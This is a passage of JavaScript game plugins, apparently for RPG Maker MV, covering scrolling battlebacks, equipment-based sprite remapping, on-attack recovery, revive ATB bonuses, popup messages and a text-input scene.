			const fsx=this._finalScaleX=final_sclx===undefined?this._finalScaleX:final_sclx; if(isNaN(this._sclx))       this._sclx=fsx;   if(isNaN(this._sclx))   this._finalScaleX=this._sclx=1;
			const fsy=this._finalScaleY=final_scly===undefined?this._finalScaleY:final_scly; if(isNaN(this._scly))       this._scly=fsy;   if(isNaN(this._scly))   this._finalScaleY=this._scly=1;
		}
	}
	this._changeFrame=Math.max(changeFrame,0)||0;
	this._finalAlpha=final_alpha;
	if(bitmap && this._bmpRef!==bitmap){
		this._lastFc=Graphics.frameCount-1;
		this._bmpRef=bitmap||this._bmpRef;
		if(this._bmpRef) this._bmpRef.addLoadListener(f.tbl[0].bind(this)); else this.alpha=0;
	}
}).ori=undefined;
t.tbl=[
function createCells(bitmap){
	const w=this._bmpW=bitmap.width  ||1;
	const h=this._bmpH=bitmap.height ||1;
	const szx=1+~~(Graphics.boxWidth  /w);
	const szy=1+~~(Graphics.boxHeight /h);
	this._loopX=((szx<<1)|1)*w;
	this._loopY=((szy<<1)|1)*h;
	if(!this._cells) this._cells=[];
	if(this._cells){
		for(let x=this._cells.length;x--;) this.removeChildAt(x);
		this._cells.length=0;
		for(let y=szy,ye=-szy,xe=-szx;y>=ye;--y){
			if(!this._loopV) y=0;
			for(let x=szx;x>=xe;--x){
				if(!this._loopH) x=0;
				const sp=new Sprite(bitmap);
				const a=sp.anchor; a.y=a.x=0.5;
				sp.x=x*w; sp.y=y*h;
				this.addChild(sp);
				this._cells.push(sp);
				if(!this._loopH) break;
			}
			if(!this._loopV) break;
		}
	}
},
];
k='update';
r=p[k]; (p[k]=function f(){
	for(let _=Graphics.frameCount-this._lastFc;_--;){
		if(this._changeFrame>=1){
			this._speedX +=(this._finalSpeedX -this._speedX )/this._changeFrame;
			this._speedY +=(this._finalSpeedY -this._speedY )/this._changeFrame;
			this._sclx   +=(this._finalScaleX -this._sclx   )/this._changeFrame;
			this._scly   +=(this._finalScaleY -this._scly   )/this._changeFrame;
			this._shx    +=(this._finalShiftX -this._shx    )/this._changeFrame;
			this._shy    +=(this._finalShiftY -this._shy    )/this._changeFrame;
			this.alpha   +=(this._finalAlpha  -this.alpha   )/this._changeFrame;
			--this._changeFrame;
		}else{
			this._speedX=this._finalSpeedX;
			this._speedY=this._finalSpeedY;
			this._sclx=this._finalScaleX;
			this._scly=this._finalScaleY;
			this._shx=this._finalShiftX;
			this._shy=this._finalShiftY;
			this.alpha=this._finalAlpha;
			this._changeFrame=0;
		}
		this.x=this._shx;
		this.y=this._shy;
		if(!this._cleared || this.alpha){ for(let x=0;x!==this._cells.length;++x){
			const cell=this._cells[x];
			if(this._speedX){
				if(this._loopH){
					if(this._speedX<0){
						if(cell.x+this._bmpW<0) cell.x+=this._loopX;
					}else{
						if(Graphics.boxWidth+this._bmpW<cell.x) cell.x-=this._loopX;
					}
				}
				cell.x+=this._speedX;
			}
			if(this._speedY){
				if(this._loopV){
					if(this._speedY<0){
						if(cell.y+this._bmpH<0) cell.y+=this._loopY;
					}else{
						if(Graphics.boxHeight+this._bmpH<cell.y) cell.y-=this._loopY;
					}
				}
				cell.y+=this._speedY;
			}
		} const scl=this.scale; scl.x=this._sclx; scl.y=this._scly; }else{ const p=this.parent; if(p){
			const curr=p._map.get(this._key);
			if(this===curr) p._map.delete(this._key);
			p.removeChild(this);
		} }
	}
	this._lastFc=Graphics.frameCount;
}).ori=r;
}

{ const p=Spriteset_Battle.prototype;
k='_dynamicBattleback_createRoot';
r=p[k]; (p[k]=function f(){
	const rt=this._dynamicBattlebacks=new Sprite(),g=Graphics;
	rt.z=0;
	this._battleField.addChild(rt);
	rt._map=new Map(); // id -> sprite
	rt.x=g.boxWidth  >>1;
	rt.y=g.boxHeight >>1;
}).ori=r;
k='createBattleback';
r=p[k]; (p[k]=function f(){
	const rtv=f.ori.apply(this,arguments);
	this._dynamicBattleback_createRoot();
	return rtv;
}).ori=r;
k='dynamicBattleback_change';
r=p[k]; (p[k]=function f(id,changeFrame,final_alpha,path,loopH,loopV,speed_x,speed_y,final_sclx,final_scly,final_shx,final_shy){
	const rt=this._dynamicBattlebacks;
	let sp=rt._map.get(id); if(!sp) rt._map.set(id,sp=new window[c]());
	sp._key=id;
	const isDirected=path&&ImageManager.isDirectPath&&ImageManager.isDirectPath(path);
	sp.setup(path&&ImageManager.loadBitmap('',(isDirected?'':'.//')+path),changeFrame,final_alpha,loopH,loopV,speed_x,speed_y,final_sclx,final_scly,final_shx,final_shy);
	rt.addChild(sp);
	if(!changeFrame) sp.update();
	return sp;
}).ori=r;
k='dynamicBattleback_clear';
r=p[k]; (p[k]=function f(id,changeFrame){
	const sp=this.dynamicBattleback_change(id,changeFrame,0);
	sp._cleared=true;
	if(!changeFrame) sp.update();
	return sp;
}).ori=r;
k='dynamicBattleback_restore';
r=p[k]; (p[k]=function f(changeFrame){
	this._dynamicBattlebacks._map.forEach((v,k)=>this.dynamicBattleback_change(k,changeFrame,0));
}).ori=r;
k='dynamicBattleback_dummy';
r=p[k]; (p[k]=function f(){
	this._dynamicBattlebacks;
}).ori=r;
}

})();


﻿"use strict";
/*:
 * @plugindesc 依裝備(armor,etypeId=4)更換讀圖對應。
 * @author agold404
 * @help 要拔這塊請往前找相關的。
 *
 * 使用：note區:
 * <角色圖變更:更換表路徑>
 * 更換表路徑是絕對路徑(可能就無法給別人玩)，或是相對自"有遊戲的index.html的資料夾"的路徑
 * 
 * This plugin can be renamed as you want.
 */

(()=>{ let k,r,t;

const kw='角色圖變更清單',kw2='角色圖變更清單resp',etypeId=4;

{ const p=ImageManager;
k='otherFiles_getPendedSet';
r=p[k]; (p[k]=function f(){
	let s=this._otherFiles_pended; if(!s) s=this._otherFiles_pended=new Set();
	return s;
}).ori=r;
k='otherFiles_getDataMap';
r=p[k]; (p[k]=function f(){
	let m=this._otherFiles; if(!m) m=this._otherFiles=new Map();
	return m;
}).ori=r;
k='otherFiles_getData';
r=p[k]; (p[k]=function f(path){
	const m=this.otherFiles_getDataMap();
	return m.get(path);
}).ori=r;
k='otherFiles_delData';
r=p[k]; (p[k]=function f(path){
	const m=this.otherFiles_getDataMap(),s=this.otherFiles_getPendedSet();
	const rtv=m.get(path);
	m.delete(path);
	s.delete(path);
	return rtv;
}).ori=r;
k='otherFiles_delDataAll';
r=p[k]; (p[k]=function f(){ // for debug
	const m=this.otherFiles_getDataMap(),s=this.otherFiles_getPendedSet();
	m.forEach(f.tbl[0].bind(m));
	s.forEach(f.tbl[0].bind(s));
}).ori=r;
p[k].tbl=[
function(v,k){this.delete(k);},
];
k='otherFiles_addLoad';
r=p[k]; (p[k]=function f(path){
	const m=this.otherFiles_getDataMap();
	if(m.has(path)) return;
	const s=this.otherFiles_getPendedSet();
	if(s.has(path)) return;
	s.add(path);
	window.jurl(path,"GET",0,0,0,(resp)=>{
		if(s.has(path)){
			m.set(path,resp);
			s.delete(path);
		}else console.warn("canceled: "+path);
	},xhr=>{ if(!(xhr.readyState>=4)) return;
		const stat=xhr.status.toString();
		if(stat==='0' || (stat.length===3 && stat[0]==='4')) s.delete(path); // nw.js: 0 ; web: 404
	});
}).ori=r;
k='otherFiles_isAllLoaded';
r=p[k]; (p[k]=function f(){
	return !this.otherFiles_getPendedSet().size;
}).ori=r;
k='isReady';
r=p[k]; (p[k]=function f(){
	return this.otherFiles_isAllLoaded()&&f.ori.apply(this,arguments);
}).ori=r;
t=k='otherFiles_'+kw+'_setItem';
r=p[k]; (p[k]=function f(item){
	if(!item) return;
	if(item[kw2]) return item[kw2];
	if(!item[kw]) return;
	const m=this.otherFiles_getDataMap();
	const s=this.otherFiles_getPendedSet();
	if(m.has(item[kw])){
		const data=m.get(item[kw]);
		if(!data){
			m.delete(item[kw]);
			return item[kw]=undefined;
		}
		return item[kw2]=data.replace(f.tbl[0][0],'').replace(f.tbl[0][1],'/').split(f.tbl[1]).map(f.tbl[2]).filter(f.tbl[3]);
	}else if(s.has(item[kw])) alert("timing error, call agold404 for help");
}).ori=r;
p[k].tbl=[
[ /\r/g, /\\/g, ],
/([ \t]*\n)+[ \t]*\n/,
p=>p.split('\n'),
p=>p&&p[0]&&p[1],
];
k='_otherFiles_'+kw+'_fromItem_common';
r=p[k]; (p[k]=function f(item,idx){
	// idx==1: del ; idx==2: add
	if(item && item[kw] && !item[kw2]) ImageManager[f.tbl[0]](item);
	if(item && item[kw2]) item[kw2].forEach(f.tbl[idx]);
}).ori=r;
p[k].tbl=[
t,
(ori_mapped)=>$gameSystem&&$gameSystem.bmpRemap_set(ori_mapped[0]),
(ori_mapped)=>$gameSystem&&$gameSystem.bmpRemap_set(ori_mapped[0],ori_mapped[1]),
];
let tmp=[undefined,];
t=[k,];
k='otherFiles_'+kw+'_fromItem_del';
r=p[k]; (p[k]=function f(item){
	this[f.tbl[0]](item,1);
}).ori=r;
p[k].tbl=t;
tmp.push(k);
k='otherFiles_'+kw+'_fromItem_add';
r=p[k]; (p[k]=function f(item){
	this[f.tbl[0]](item,2);
}).ori=r;
p[k].tbl=t;
tmp.push(k);
t=undefined;
t=tmp;
}

{ const p=Scene_Boot.prototype;
k='start';
r=p[k]; (p[k]=function f(){
	const s=new Set();
	$dataArmors.forEach(f.tbl[1],s);
	$dataWeapons.forEach(f.tbl[1],s);
	ImageManager.mappingLists=ImageManager.mappingLists||new Map();
	s._loaded=0;
	s.forEach(f.tbl[0].bind(s));
	return f.ori.apply(this,arguments);
}).ori=r;
p[k].tbl=[
path=>path&&ImageManager.otherFiles_addLoad(path),
function(equip){ equip&&this.add(equip[kw]=equip&&equip.etypeId===etypeId&&equip.meta[kw]); },
];
}

{ const p=Game_Item.prototype;
for(let ki=0,kv=['setEquip','setObject',];ki!==kv.length;++ki){
k=kv[ki];
r=p[k]; (p[k]=function f(){
	const br=this.constructor.bmpRemap;
	if(br) ImageManager[f.tbl[1]](this.object());
	const rtv=f.ori.apply(this,arguments);
	if(br) ImageManager[f.tbl[2]](this.object());
	return rtv;
}).ori=r;
p[k].tbl=t;
}
k='bmpRemap_del';
r=p[k]; (p[k]=function f(item){
	ImageManager[f.tbl[1]](item);
}).ori=r;
p[k].tbl=t;
k='bmpRemap_add';
r=p[k]; (p[k]=function f(item){
	ImageManager[f.tbl[2]](item);
}).ori=r;
p[k].tbl=t;
}

{ const p=Game_Temp.prototype;
k='get_isClonedActors_scEquip';
r=p[k]; (p[k]=function f(){
	let s=$gameTemp._isClonedActors_scEquip; if(!s) s=$gameTemp._isClonedActors_scEquip=new Set();
	return s;
}).ori=r;
}

{ const p=Scene_Equip.prototype;
for(let ki=0,kv=['onItemCancel','terminate',];ki!==kv.length;++ki){
k=kv[ki];
r=p[k]; (p[k]=function f(){
	const rtv=f.ori.apply(this,arguments);
	$gameTemp && $gameTemp.get_isClonedActors_scEquip().clear();
	return rtv;
}).ori=r;
} // for
}

{ const p=JsonEx;
k='makeDeepCopy';
r=p[k]; (p[k]=function f(){
	if(1>=arguments.length && arguments[0]===undefined) return;
	const rtv=f.ori.apply(this,arguments);
	if( rtv && rtv.constructor===Game_Actor && $gameTemp && SceneManager.getScConstructor()===Scene_Equip ) $gameTemp.get_isClonedActors_scEquip().add(rtv);
	return rtv;
}).ori=r;
}

{ const p=Game_Actor.prototype;

k='isCloned_scEquip';
r=p[k]; (p[k]=function f(){
	return $gameTemp && $gameTemp.get_isClonedActors_scEquip().has(this) && !this._asNotCloned;
}).ori=r;

for(let ki=0,kv=['changeEquip','forceChangeEquip','discardEquip','releaseUnequippableItems',];ki!==kv.length;++ki){
k=kv[ki];
r=p[k]; (p[k]=function f(item){
	Game_Item.bmpRemap=!this.isCloned_scEquip();
	const rtv=f.ori.apply(this,arguments);
	Game_Item.bmpRemap=false;
	return rtv;
}).ori=r;
}

t=[
gItem=>gItem.setObject(null),
];
for(let ki=0,kv=['initMembers','initEquips',];ki!==kv.length;++ki){
k=kv[ki];
r=p[k]; (p[k]=function f(item){
	Game_Item.bmpRemap=!this.isCloned_scEquip();
	if(this._equips) this._equips.forEach(f.tbl[0]);
	const rtv=f.ori.apply(this,arguments);
	Game_Item.bmpRemap=false;
	return rtv;
}).ori=r;
p[k].tbl=t;
}

}

})();


﻿"use strict";
/*:
 * @plugindesc 攻擊時回血/魔/TP
 * @author agold404
 * @help <攻擊恢復_p_>
 * <攻擊恢復HpF> 固定
 * <攻擊恢復HpM> 依自身最大HP
 * <攻擊恢復HpD> 依傷害
 * <攻擊恢復MpF> 固定
 * <攻擊恢復MpM> 依自身最大MP
 * <攻擊恢復MpD> 依傷害
 * <攻擊恢復TpF> 固定
 * <攻擊恢復TpM> 依自身最大TP
 * <攻擊恢復TpD> 依傷害
 * <____J> eval(javascript)
 * 
 * This plugin can be renamed as you want.
 */

if(!window.addEnum) window.addEnum=function(key){
	if(this[key]) return;
	this._enumMax|=0;
	this[key]=++this._enumMax;
	return this;
};

(()=>{ let k,r,t; const gbb=Game_BattlerBase;

const kwp="攻擊恢復",kws={
Hp:{
	F:[],
	M:[],
	D:[],
	J:[],
},
Mp:{
	F:[],
	M:[],
	D:[],
	J:[],
},
Tp:{
	F:[],
	M:[],
	D:[],
	J:[],
},
},kwInfov=[];

if(!gbb._enumMax) gbb._enumMax=404;
if(!gbb.addEnum) gbb.addEnum=window.addEnum;
for(let kp in kws){ const codeKw=kwp+kp; gbb.addEnum(codeKw); for(let kt in kws[kp]){
	kwInfov.push(kws[kp][kt]=[codeKw+kt,gbb[codeKw],kt,codeKw,]);
} }
gbb.addEnum('__END__');

{ const p=Scene_Boot.prototype;
k='start';
r=p[k]; (p[k]=function f(){
	$dataActors  .forEach(f.tbl[0]);
	$dataClasses .forEach(f.tbl[0]);
	$dataSkills  .forEach(f.tbl[0]);
	$dataItems   .forEach(f.tbl[0]);
	$dataWeapons .forEach(f.tbl[0]);
	$dataArmors  .forEach(f.tbl[0]);
	$dataEnemies .forEach(f.tbl[0]);
	$dataTroops  .forEach(f.tbl[0]);
	$dataStates  .forEach(f.tbl[0]);
	return f.ori.apply(this,arguments);
}).ori=r;
p[k].tbl=[
t=function f(dataobj){ const meta=dataobj&&dataobj.meta; if(!meta) return;
	f.tbl[1].forEach(f.tbl[0],dataobj);
},
];
t.tbl=[
function(kwInfo){ const dataobj=this;
	const val=kwInfo[2]==="J"?dataobj.meta[kwInfo[0]]:(dataobj.meta[kwInfo[0]]-0);
	if(val && dataobj.traits) dataobj.traits.push({code:kwInfo[1],dataId:kwInfo[2],value:val});
},
kwInfov,
];
t=undefined;
}

{
t=function(__t){ eval(__t.value); };
}

{ const p=Game_Battler.prototype;
k='_get_攻擊恢復';
r=p[k]; (p[k]=function f(dmgVal,maxp,tblp){
	let rtv=0;
	rtv+=this.traitsSum(tblp.F[1],tblp.F[2]);
	rtv+=this.traitsSum(tblp.M[1],tblp.M[2])*maxp;
	rtv+=this.traitsSum(tblp.D[1],tblp.D[2])*dmgVal;
	rtv+=this.traitsWithId(tblp.J[1],tblp.J[2]).map(f.tbl[0],this).reduce(f.tbl[1],0);
	return rtv*this.rec;
}).ori=r;
p[k].tbl=[
t,
(r,n)=>r+n,
];
t=undefined;
t=[k,kws];
k='get_攻擊恢復hp';
r=p[k]; (p[k]=function f(dmgVal){
	return this[f.tbl[0]](dmgVal,this.mhp,f.tbl[1].Hp);
}).ori=r;
p[k].tbl=t;
k='get_攻擊恢復mp';
r=p[k]; (p[k]=function f(dmgVal){
	return this[f.tbl[0]](dmgVal,this.mmp,f.tbl[1].Mp);
}).ori=r;
p[k].tbl=t;
k='get_攻擊恢復tp';
r=p[k]; (p[k]=function f(dmgVal){
	return this[f.tbl[0]](dmgVal,this.maxTp(),f.tbl[1].Tp);
}).ori=r;
p[k].tbl=t;
t=undefined;
}

{ const p=Game_Action.prototype;
for(let ki=0,kv=['executeHpDamage','executeMpDamage',];ki!==kv.length;++ki){
k=kv[ki];
// targeting to most top-0x1
let fp=p[k],fc=p[k].ori;
while(fc){
	if(fc.ori){
		fp=fc;
		fc=fc.ori;
	}else break;
}
(fp.ori=function f(trgt,val){
	if(val>0){
		const subject=this.subject();
		const hitRecHp=~~subject.get_攻擊恢復hp(val);
		const hitRecMp=~~subject.get_攻擊恢復mp(val);
		const hitRecTp=~~subject.get_攻擊恢復tp(val);
		if(hitRecHp) subject.gainHp(hitRecHp);
		if(hitRecMp) subject.gainMp(hitRecMp);
		if(hitRecTp) subject.gainTp(hitRecTp);
	}
	return f.ori.apply(this,arguments);
}).ori=fc;
} // for
}

})();


﻿"use strict";
/*:
 * @plugindesc 復活恢復atb條%
 * @author agold404
 * @help 有traits的東西上的note：
 * <復活恢復atb條%:n>
 * n為一實數，不為Number()認定為數字則不計。
 * 實際套用效果時，加總所有此效果，若<0則沒有任何事情會發生，除了浪費計算資源。
 * 
 * This plugin can be renamed as you want.
 */

if(!window.addEnum) window.addEnum=function(key){
	if(this[key]) return;
	this._enumMax|=0;
	this[key]=++this._enumMax;
	return this;
};

(()=>{ let k,r,t; const gbb=Game_BattlerBase;

const kw='復活恢復atb條%';
const kw_main='get_'+kw;

if(!gbb._enumMax) gbb._enumMax=404;
if(!gbb.addEnum) gbb.addEnum=window.addEnum;
gbb.addEnum(kw);
gbb.addEnum('__END__');

{ const p=Scene_Boot.prototype;
k='start';
r=p[k]; (p[k]=function f(){
	$dataActors  .forEach(f.tbl[0]);
	$dataClasses .forEach(f.tbl[0]);
	$dataSkills  .forEach(f.tbl[0]);
	$dataItems   .forEach(f.tbl[0]);
	$dataWeapons .forEach(f.tbl[0]);
	$dataArmors  .forEach(f.tbl[0]);
	$dataEnemies .forEach(f.tbl[0]);
	$dataTroops  .forEach(f.tbl[0]);
	$dataStates  .forEach(f.tbl[0]);
	return f.ori.apply(this,arguments);
}).ori=r;
p[k].tbl=[
dataobj=>{ const meta=dataobj&&dataobj.meta; if(!meta) return;
	const val=meta[kw]-0;
	const ts=val&&dataobj.traits; if(ts) ts.push({code:gbb[kw],dataId:1,value:val});
},
];
}

{ const p=Game_BattlerBase.prototype;
k=kw_main;
r=p[k]; (p[k]=function f(){
	const rtv=this.traitsSum(f.tbl[0],1);
	return rtv>0?rtv:0;
}).ori=r;
p[k].tbl=[
gbb[kw],
];
k='revive';
r=p[k]; (p[k]=function f(){
	if(SceneManager.isScene_battle() && BattleManager._atbTarget){
		const val=this[f.tbl[0]]()||0;
		if(val>0) this._atbSpeed+=BattleManager._atbTarget*val/100.0;
	}
	return f.ori.apply(this,arguments);
}).ori=r;
p[k].tbl=[
kw_main,
];
}

})();


﻿"use strict";
/*:
 * @plugindesc popup msg
 * @author agold404
 * @help .
 * 
 * This plugin can be renamed as you want.
 */

(()=>{ let k,r,t;

const a=function Window_PopupMsg(){
	this.initialize.apply(this,arguments);
};
a.ori=Window_Help;
t=[a.ori.prototype];
window[a.name]=a;
const p=a.prototype=Object.create(t[0]);
p.constructor=a;
new cfc(p).add('initialize',function f(numLines,opt){
	const rtv=f.tbl[0].initialize.apply(this,arguments);
	this._currFrame=0;
	if(opt){
		// dur = show + fade
		this._showFrame=opt.showFrame;
		this._fadeFrame=opt.fadeFrame;
	}
	if(isNaN(this._showFrame)) this._showFrame=90;
	if(isNaN(this._fadeFrame)) this._fadeFrame=30;
	if(this._fadeFrame<0) this._fadeFrame=0;
	this._isEnded=false;
	return rtv;
},t,false,true);
new cfc(p).add('update',function f(){
	const rtv=f.tbl[0].update.apply(this,arguments);
	++this._currFrame;
	if(this._currFrame>=this._showFrame){
		if(this._currFrame>=this._showFrame+this._fadeFrame){
			this.alpha=0;
			this._isEnded=true;
		}else this.alpha=(this._showFrame+this._fadeFrame-this._currFrame)/this._fadeFrame;
	}
	return rtv;
},t,false,true);

new cfc(Game_Temp.prototype).add('popupMsg',function f(msg,opt){
	// opt = {loc:"LU/LD/RU/RD/UL/DL/UR/DR"}
	opt=opt||f.tbl[0];
	const root=this._popupMsg_getCont(opt); if(!root) return;
	msg+='';
	const lines=msg.split('\n');
	const wnd=new Window_PopupMsg(lines.length,opt);
	wnd.width=isNaN(opt.width)?root._maxWidth:opt.width-0;
	wnd.setText(msg);
	root.addChild(wnd);
},[
{loc:"UR",},
]).add('_popupMsg_getCont',function f(opt){
	// opt = {loc:"LU/LD/RU/RD/UL/DL/UR/DR"}
	if(!f.tbl[1]){ f.tbl[1]={
		UR:"UR",
		RU:"UR",
		DR:"DR",
		RD:"DR",
		UL:"UL",
		LU:"UL",
		DL:"DL",
		LD:"DL",
	}; }
	const loc=f.tbl[1][opt&&opt.loc]; // false-like: global root
	let rtv=$gameTemp._popupMsgs;
	if(!rtv){
		rtv=$gameTemp._popupMsgs=new Sprite();
		const rmc=f.tbl[0].removeChild; if(rmc) rtv.removeChild=rmc;
	}
	const sc=SceneManager._scene; if(sc && sc!==rtv.parent) sc.addChild(sc._popupMsgs=rtv);
	if(loc){
		if(!rtv[loc]) rtv=rtv[loc]=f.tbl[2][loc](f.tbl,rtv);
		else rtv=rtv[loc];
	}
	return rtv;
},[
{
update:function f(){
	const rtv=Sprite.prototype.update.apply(this,arguments);
	const arr=this.children; if(arr) for(let x=arr.length;x--;) if(arr[x]._isEnded) this.removeChildAt(x);
	return rtv;
},
addChild:function f(c){
	const arr=this.children;
	let len=arr&&arr.length;
	if(this._atBtm){
		if(len&&arr.back.y+arr.back.height<c.height) this.removeChildAt(--len);
		c.y=this._maxHeight-c.height;
		if(len){
			arr[0].y=c.y-arr[0].height; for(let x=1;x!==len;++x) arr[x].y=arr[x-1].y-arr[x].height;
		}
	}else{
		if(len&&c.height+arr.back.y>=this._maxHeight) this.removeChildAt(--len);
		c.y=0;
		if(len){
			arr[0].y=c.height; for(let x=1;x!==len;++x) arr[x].y=arr[x-1].y+arr[x-1].height;
		}
	}
	return Sprite.prototype.addChildAt.call(this,c,0);
},
removeChild:function (c){
	return;
}, // disabled
},
undefined,
{
UR:function(tbl,sp){
	let rtv=sp._UR;
	if(!rtv){
		rtv=sp._UR=new Sprite();
		rtv._atBtm=false;
		for(let k in tbl[0]) rtv[k]=tbl[0][k];
		rtv.x=Graphics.boxWidth>>1;
		rtv.y=0;
		rtv._maxWidth=Graphics.boxWidth>>1;
		rtv._maxHeight=Graphics.boxHeight;
		sp.addChild(rtv);
	}
	return rtv;
},
DR:function(tbl,sp){
	let rtv=sp._DR;
	if(!rtv){
		rtv=sp._DR=new Sprite();
		rtv._atBtm=true;
		for(let k in tbl[0]) rtv[k]=tbl[0][k];
		rtv.x=Graphics.boxWidth>>1;
		rtv.y=0;
		rtv._maxWidth=Graphics.boxWidth>>1;
		rtv._maxHeight=Graphics.boxHeight;
		sp.addChild(rtv);
	}
	return rtv;
},
UL:function(tbl,sp){
	let rtv=sp._UL;
	if(!rtv){
		rtv=sp._UL=new Sprite();
		rtv._atBtm=false;
		for(let k in tbl[0]) rtv[k]=tbl[0][k];
		rtv.x=0;
		rtv.y=0;
		rtv._maxWidth=Graphics.boxWidth>>1;
		rtv._maxHeight=Graphics.boxHeight;
		sp.addChild(rtv);
	}
	return rtv;
},
DL:function(tbl,sp){
	let rtv=sp._DL;
	if(!rtv){
		rtv=sp._DL=new Sprite();
		rtv._atBtm=true;
		for(let k in tbl[0]) rtv[k]=tbl[0][k];
		rtv.x=0;
		rtv.y=0;
		rtv._maxWidth=Graphics.boxWidth>>1;
		rtv._maxHeight=Graphics.boxHeight;
		sp.addChild(rtv);
	}
	return rtv;
},
},
undefined,
]);

new cfc(SceneManager).add('onSceneChange',function f(){
	const rtv=f.ori&&f.ori.apply(this,arguments);
	this.onSceneChange_popupMsgs();
	return rtv;
}).add('onSceneChange_popupMsgs',function f(){
	// addChild
	return $gameTemp&&$gameTemp._popupMsg_getCont();
});

new cfc(Scene_Map.prototype).add('createDisplayObjects',function f(){
	const msgs=this._popupMsgs;
	if(msgs) this.removeChild(msgs);
	const rtv=f.ori.apply(this,arguments);
	if(msgs) this.addChild(msgs);
	return rtv;
});

})();


﻿"use strict";
/*:
 * @plugindesc 文字輸入
 * @author agold404
 * @help .
 * $gameTemp.scTxt={val:"",disabled:false,noCancel:false,readOnly:false,res:undefined,onOk_eval:undefined,onOk_call:undefined};
 * SceneManager.push(Scene_HTML_textarea);
 * $gameTemp.scTxt.res
 * $gameTemp.scTxt.val
 * $gameTemp.scTxt.onOk_call: called if it is a function ; 'this' is 'window' in the function
 * $gameTemp.scTxt.onOk_eval: eval()ed if it is true-like ; use string to bypass note parsing
 * * '$gameTemp.scTxt.onOk_call' is called first, then '$gameTemp.scTxt.onOk_eval' is evaluated.
 * 
 * This plugin can be renamed as you want.
 */

(()=>{ let k,r,t,f;


{ 
const a=function Window_Command_scTxtarea(){
	// Scene_HTML_textarea
	this.initialize.apply(this, arguments);
};
a.ori=Window_Command;
window[a.name]=a;
const p=a.prototype=Object.create(a.ori.prototype);
p.constructor=a;

k='initialize';
cf(p,k,f=function f(x,y,w,h,opt){
	opt=opt||f.tbl[2];
	if(!this._list) this._list=[];
	this._list._map=new Map();
	this._list.sc=opt.sc;
	return f.tbl[1][f.tbl[0]].apply(this,arguments);
},[k,a.ori.prototype,{sc:undefined}]);

k='clearCommandList';
cf(p,k,f=function f(){
	if(this._list){
		this._list.length=0;
		this._list._map.clear();
	}else (this._list=[])._map=new Map();
},);

k='isSymbolEnabled';
cf(p,k,f=function f(symbol){
	return this._list && this._list._map && this._list._map.get(symbol);
},);

k='makeCommandList';
cf(p,k,f=function f(){
	let someTrue=false;
	for(let x=0,arr=f.tbl;x!==arr.length;++x){
		const enabled=arr[x][2].call(this._list.sc);
		someTrue=someTrue||enabled;
		this.addCommand(arr[x][0],arr[x][1],enabled);
		const last=this._list.back;
		this._list._map.set(last.symbol,last.enabled);
	}
	if(this._list.length!==this._list._map.size){
		const s="[WARNING] "+this.constructor.name+": "+"duplicated symbol";
		console.warn(s);
		alert(s);
	}
	if(!someTrue){
		const s="[WARNING] "+this.constructor.name+": "+"no button can be pressed";
		console.warn(s);
		alert(s);
	}
});
t=[
function(){ return !this.txt_readOnly(); },
function(){ return !this.txt_noCancel(); },
];
f.tbl=[
['Edit','edit',t[0],],
['Ok','ok',t[0],],
['Cancel','cancel',t[1],],
];

t=undefined;
} // Window_Command_scTxtarea


{ 
const a=function Scene_HTML_textarea(){
	this.initialize.apply(this, arguments);
};
a.ori=Scene_MenuBase;
window[a.name]=a;
const p=a.prototype=Object.create(a.ori.prototype);
p.constructor=a;

k='initialize';
cf(p,k,f=function f(){
	f.tbl[1][f.tbl[0]].apply(this,arguments);
	this._prevScene_store();
	this._stat=0; // 0:cmd 1:txt
	this._fc_endEdit=0;
},[k,a.ori.prototype]);

k='create';
cf(p,k,f=function f(){
	f.tbl[1][f.tbl[0]].apply(this,arguments);
	this._prevScene_restore();
	this.initResult();
	this.createTitleWindow();
	this.createCommandWindow();
	this.createTextareaBack();
	this.createDivRoot();
	this.createTextarea();
	this.createCommandWindowDiv();
},[k,a.ori.prototype]);

k='start';
cf(p,k,f=function f(){
	f.tbl[1][f.tbl[0]].apply(this,arguments);
	this._fc_endEdit=Graphics.frameCount;
	TouchInput.bypassPreventDefault_wheel_stackPushTrue();
	TouchInput.bypassPreventDefault_touch_stackPushTrue();
},[k,a.ori.prototype]);

k='terminate';
cf(p,k,f=function f(){
	TouchInput.bypassPreventDefault_touch_stackPop();
	TouchInput.bypassPreventDefault_wheel_stackPop();
	if(this.node_root) this.node_root.style.display="none";
	return f.tbl[1][f.tbl[0]].apply(this,arguments);
},[k,a.ori.prototype]);

k='createTitleWindow';
cf(p,k,function f(){
	const obj=this._txt_obj();
	if(obj.title===undefined) return;
	this._titleWindow=undefined;
	const w=this._titleWindow=new Window_Help(1);
	w.setText(obj.title);
	this.addWindow(w);
},[k,a.ori.prototype]);

k='createCommandWindow';
cf(p,k,function f(){
	const cmdw=this._commandWindow=new Window_Command_scTxtarea(0, 0, undefined, undefined, {sc:this,});
	for(let x=0,arr=f.tbl;x!==arr.length;++x) if(cmdw.isSymbolEnabled(arr[x])) cmdw.setHandler(arr[x],this['command_'+arr[x]].bind(this));
	if(this._titleWindow) cmdw.y+=this._titleWindow.height;
	this.addWindow(cmdw);
},['edit','ok','cancel',]);

k='command_edit';
cf(p,k,function f(){
	if(this.node_txta){
		this.node_txta.focus();
	}else this._commandWindow.active();
});

k='command_ok';
cf(p,k,function f(){
	this.txt_set(this.node_txta.value,true);
	if(typeof $gameTemp.scTxt.onOk_call==='function'){
		const func=$gameTemp.scTxt.onOk_call;
		$gameTemp.scTxt.onOk_call=undefined;
		try{
			func.call(null);
			$gameTemp.popupMsg(f.tbl[0].ok);
		}catch(e){
			console.warn('Scene_HTML_textarea','onOk_call',e);
			$gameTemp.popupMsg(f.tbl[0].fail);
		}
	}
	if($gameTemp.scTxt.onOk_eval){
		const s=$gameTemp.scTxt.onOk_eval;
		$gameTemp.scTxt.onOk_eval=undefined;
		try{
			{ let f; { eval(s); } }
			$gameTemp.popupMsg(f.tbl[0].ok);
		}catch(e){
			console.warn('Scene_HTML_textarea','onOk_eval',e);
			$gameTemp.popupMsg(f.tbl[0].fail);
		}
	}
	SceneManager.pop();
},[
{
fail:"執行失敗",
ok:"執行成功",
},
]);

k='command_cancel';
cf(p,k,function f(){
	const func=f.tbl[this._stat];
	if(func) func.call(this);
	else SceneManager.pop();
},[
function(){
	if(this._fc_endEdit+1<Graphics.frameCount) SceneManager.pop(); // prevent bouncing
	else this._commandWindow.active();
},
function(){
	this.node_cmdDom.focus();
},
]);

k='createTextareaBack';
cf(p,k,function f(){
	const cmdw=this._commandWindow;
	const xy=cmdw.getGlobalPosition();
	const x=xy.x+cmdw.scale.x*cmdw.windowWidth();
	const y=this._titleWindow?this._titleWindow.height:0;
	const h=Graphics.boxHeight-y;
